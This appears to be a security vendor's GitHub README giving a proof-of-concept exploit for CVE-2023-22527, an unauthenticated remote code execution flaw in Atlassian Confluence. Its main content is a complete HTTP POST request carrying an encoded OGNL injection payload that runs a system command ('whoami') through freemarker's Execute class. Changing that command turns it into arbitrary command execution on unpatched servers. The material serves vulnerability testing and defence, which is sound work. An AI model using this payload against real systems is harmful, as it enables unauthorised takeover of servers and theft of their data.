# Atlassian Confluence CVE-2023-22527 PoC Exploit
Atlassian disclosed a remote code execution vulnerability affecting the Confluence Data Center and Confluence. <br><br>
In this repo, Picus provides a Proof-of-Concept exploit for the CVE-2023-22527 vulnerability.

Test security controls against the CVE-2023-22527 vulnerability exploit 
--------------------------------------
Picus can help you simulate the CVE-2023-22527 vulnerability exploits for free. No setup or signup is required.<br>
Use [Picus Emerging Threat Simulator](https://insights.picussecurity.com/emerging-threat-simulator-announcement?utm_source=github&utm_medium=organic+social&utm_campaign=PLS+Offensive+-+ET+Simulator) and test your defenses in a few clicks.<br> 

If you are looking for more detailed information, check out our blog post: [CVE-2023-22527: Another OGNL Injection Leads to RCE in Atlassian Confluence](https://www.picussecurity.com/resource/blog/cve-2023-22527-another-ognl-injection-leads-to-rce-in-atlassian-confluence)


CVE-2023-22527 Proof-of-concept (POC)
----------------------
Atlassian Confluence CVE-2023-22527 vulnerability is an OGNL injection vulnerability that allows unauthenticated adversaries to execute arbitrary commands remotely in a vulnerable Confluence instance. The vulnerability stems from a Velocity template file named "text-inline.vm" [3]. This file allows adversaries to execute commands by using the expression "#request['.KEY_velocity.struts2.context'].internalGet('ognl')".

The example HTTP POST request below exploits the CVE-2023-22527 vulnerability to execute arbitrary commands remotely.

#### Example CVE-2023-22527 Exploit:
```http
POST /template/aui/text-inline.vm HTTP/1.1
Host: <vulnerable_Confluence_instance>
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 243

label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,%7b%7d)%2b\u0027&x=(new freemarker.template.utility.Execute()).exec(%7b%22whoami%22%7d)
```

Disclaimer
----------
Â©2024 Picus Security <br>
All rights reserved.
